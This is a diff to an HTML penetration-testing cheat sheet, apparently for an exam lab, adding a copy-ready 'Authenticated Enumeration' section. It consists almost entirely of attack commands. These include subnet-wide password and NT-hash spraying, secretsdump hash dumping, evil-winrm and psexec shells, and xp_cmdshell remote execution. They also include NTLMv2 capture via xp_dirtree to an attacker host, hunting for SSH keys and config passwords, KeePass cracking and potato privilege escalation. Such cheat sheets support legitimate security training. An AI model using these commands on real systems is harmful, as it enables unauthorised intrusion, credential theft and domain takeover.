@@ -137,6 +137,7 @@
       <li><a href="#http-alt">8080 — Tomcat/Jenkins</a></li>
       <li><a href="#unknown">Unknown Port</a></li>
       <li><a href="#defaults">Default Creds</a></li>
+      <li><a href="#auth-enum">Authenticated Enum</a></li>
     </ul>
   </aside>
   <main class="main">
@@ -675,6 +676,180 @@ root:                 root:password         guest:guest
 administrator:Password123    administrator:Welcome1
 tomcat:s3cret         sa:sa                 sa:password
 pi:raspberry          admin:1234            ubnt:ubnt</pre></div>
+    </section>
+
+    <!-- AUTHENTICATED ENUM -->
+    <section class="sec" id="auth-enum">
+      <div class="sec-head"><h2>Authenticated Enumeration — Once You Have Creds</h2></div>
+      <div class="note n-info">Got credentials from anywhere (SNMP, LDAP description, spray, cracked hash)? Run all of these before moving to exploitation.</div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">build creds files first</span><div class="cb-tags"><span class="tag t-crit">do this first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># users.txt — collect from every source:</span>
+grep "sAMAccountName:" ~/exam/loot/ldap_auth.txt | awk '{print $2}' &gt;&gt; ~/exam/loot/users.txt
+rpcclient -U "" -N &lt;IP&gt; -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' &gt;&gt; ~/exam/loot/users.txt
+crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --users | awk '{print $5}' &gt;&gt; ~/exam/loot/users.txt
+sort -u ~/exam/loot/users.txt -o ~/exam/loot/users.txt   <span class="c"># deduplicate</span>
+
+<span class="c"># passwords.txt — every cred found so far:</span>
+cat &gt; ~/exam/loot/passwords.txt &lt;&lt; 'EOF'
+Password123!
+Welcome1
+Welcome2024!
+Summer2024!
+&lt;company_name&gt;2024
+&lt;hostname&gt;
+&lt;any_found_password&gt;
+EOF</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">spray users.txt × passwords.txt — password reuse</span><div class="cb-tags"><span class="tag t-crit">high yield</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># SMB — most reliable, check Pwn3d! in output:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --continue-on-success --no-bruteforce
+<span class="c"># --no-bruteforce = pairs users[0]:passwords[0], users[1]:passwords[1] (same index)</span>
+<span class="c"># Without --no-bruteforce = full matrix (every user × every password) — use only if lockout=0</span>
+
+<span class="c"># SSH:</span>
+crackmapexec ssh &lt;subnet&gt;/24 -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --continue-on-success --no-bruteforce
+
+<span class="c"># WinRM:</span>
+crackmapexec winrm &lt;subnet&gt;/24 -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --no-bruteforce
+
+<span class="c"># MSSQL:</span>
+crackmapexec mssql &lt;subnet&gt;/24 -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --no-bruteforce
+
+<span class="c"># Targeted single host, full matrix (only when lockout policy is safe):</span>
+crackmapexec smb &lt;IP&gt; -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --continue-on-success</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">hash reuse — spray NTHash across all hosts</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Single hash across subnet:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -H &lt;NThash&gt; --continue-on-success
+crackmapexec smb &lt;subnet&gt;/24 -u ~/exam/loot/users.txt -H &lt;NThash&gt; --continue-on-success
+
+<span class="c"># Multiple hashes from secretsdump — spray all at once:</span>
+grep -oP ':\K[a-f0-9]{32}(?=:::)' ~/exam/loot/secretsdump.txt | sort -u &gt; ~/exam/loot/hashes.txt
+crackmapexec smb &lt;subnet&gt;/24 -u ~/exam/loot/users.txt -H ~/exam/loot/hashes.txt --continue-on-success</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> [+] &lt;domain&gt;\&lt;user&gt;:&lt;pass&gt; (Pwn3d!) on any host</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- dump hashes from that host</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- get shell if WinRM open</span></span>
+          <span class="sig-cmd">impacket-psexec &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- SYSTEM shell via SMB</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> [+] valid creds but no Pwn3d! — low priv user</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --shares <span class="sig-note">-- check what shares this user can read</span></span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All <span class="sig-note">-- run BloodHound with new account</span></span>
+          <span class="sig-cmd">impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request <span class="sig-note">-- Kerberoast with new account</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Hash spray hits Pwn3d! on DC</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' -just-dc-ntlm <span class="sig-note">-- full domain dump</span></span>
+          <span class="sig-cmd">type C:\Users\Administrator\Desktop\proof.txt <span class="sig-note">-- grab proof immediately</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> All sprays return [-] — nothing works</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol <span class="sig-note">-- recheck lockout threshold before more spraying</span></span>
+          <span class="sig-note">-- Add any new passwords found during enumeration to passwords.txt and re-spray</span>
+        </div>
+      </div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">validate creds across all services at once</span><div class="cb-tags"><span class="tag t-crit">first step</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --continue-on-success
+crackmapexec winrm &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;'
+crackmapexec ssh &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;'
+crackmapexec mssql &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;'
+crackmapexec rdp &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;'</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">authenticated SMB — shares + spider</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --shares
+crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M spider_plus   <span class="c"># spider all readable shares</span>
+smbclient -L //&lt;IP&gt; -U &lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;
+smbclient //&lt;IP&gt;/&lt;share&gt; -U &lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;
+<span class="c"># Inside: recurse ON; prompt OFF; mget *</span>
+
+<span class="c"># RPC user + group enum with creds:</span>
+rpcclient -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" &lt;IP&gt; -c "enumdomusers;querydispinfo;enumdomgroups"</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">authenticated LDAP — full user dump</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>ldapsearch -x -H ldap://&lt;IP&gt; -D "&lt;user&gt;@&lt;domain&gt;" -w '&lt;pass&gt;' \
+  -b "DC=corp,DC=local" "(objectClass=user)" \
+  sAMAccountName description memberOf userAccountControl servicePrincipalName \
+  2&gt;/dev/null | tee ~/exam/loot/ldap_auth.txt
+
+<span class="c"># Extract usernames:</span>
+grep "sAMAccountName:" ~/exam/loot/ldap_auth.txt | awk '{print $2}' &gt; users.txt
+
+<span class="c"># Hunt passwords in descriptions:</span>
+grep "description:" ~/exam/loot/ldap_auth.txt | grep -iv "built-in\|default\|accounts"
+
+<span class="c"># Find kerberoastable accounts:</span>
+grep -B5 "servicePrincipalName:" ~/exam/loot/ldap_auth.txt | grep "sAMAccountName"</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">authenticated MSSQL — enum + RCE</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-mssqlclient &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; -windows-auth
+impacket-mssqlclient &lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;   <span class="c"># SQL auth</span>
+
+<span class="c"># Once in:</span>
+SELECT IS_SRVROLEMEMBER('sysadmin');          <span class="c">-- 1 = full control</span>
+SELECT name FROM sys.databases;
+SELECT * FROM sys.servers;                    <span class="c">-- linked servers</span>
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+<span class="c"># Capture NTLMv2 via xp_dirtree (run Responder first):</span>
+sudo responder -I tun0 -wv
+EXEC xp_dirtree '\\&lt;KALI&gt;\share', 1, 1;</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">authenticated SSH — reuse + key hunt</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>ssh &lt;user&gt;@&lt;IP&gt;
+ssh -i id_rsa &lt;user&gt;@&lt;IP&gt;
+
+<span class="c"># Once in — look for reuse:</span>
+cat ~/.bash_history
+find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2&gt;/dev/null
+find / -name "wp-config.php" -o -name ".env" -o -name "config.php" 2&gt;/dev/null | xargs grep -l "pass" 2&gt;/dev/null
+cat /etc/passwd | grep -v nologin | grep -v false   <span class="c"># shell users</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">authenticated WinRM / RDP — immediate post-access steps</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># WinRM:</span>
+evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;'
+
+<span class="c"># Once in — run immediately:</span>
+whoami /all                          <span class="c"># check all privs + group memberships</span>
+net localgroup administrators        <span class="c"># who else is local admin?</span>
+cmdkey /list                         <span class="c"># saved credentials</span>
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  <span class="c"># autologon</span>
+netstat -ano | findstr LISTENING     <span class="c"># internal services not seen from outside</span>
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"</pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> (Pwn3d!) on any host during subnet sweep</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- dump hashes immediately</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- get shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> spider_plus finds interesting file (passwords.txt, config, .kdbx)</span>
+          <span class="sig-cmd">smbclient //&lt;IP&gt;/&lt;share&gt; -U &lt;domain&gt;/&lt;user&gt;%&lt;pass&gt; -c "get &lt;file&gt;" <span class="sig-note">-- grab it</span></span>
+          <span class="sig-cmd">keepass2john keepass.kdbx &gt; kp.hash && john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash <span class="sig-note">-- crack if KeePass</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> MSSQL — IS_SRVROLEMEMBER('sysadmin') returns 1</span>
+          <span class="sig-cmd">EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; <span class="sig-note">-- instant RCE</span></span>
+          <span class="sig-cmd">EXEC xp_dirtree '\\&lt;KALI&gt;\share', 1, 1; <span class="sig-note">-- capture NTLMv2 hash via Responder</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> whoami /all shows SeImpersonatePrivilege Enabled</span>
+          <span class="sig-cmd">.\GodPotato-NET4.exe -cmd "cmd /c whoami" <span class="sig-note">-- potato privesc to SYSTEM</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> netstat shows port 8080/3306/etc listening on 127.0.0.1 only</span>
+          <span class="sig-cmd">ssh -L 8080:127.0.0.1:8080 &lt;user&gt;@&lt;IP&gt; -N -f <span class="sig-note">-- forward internal port to kali</span></span>
+          <span class="sig-cmd">curl http://localhost:8080 <span class="sig-note">-- now accessible locally on kali</span></span>
+        </div>
+      </div>
     </section>
 
   </main>
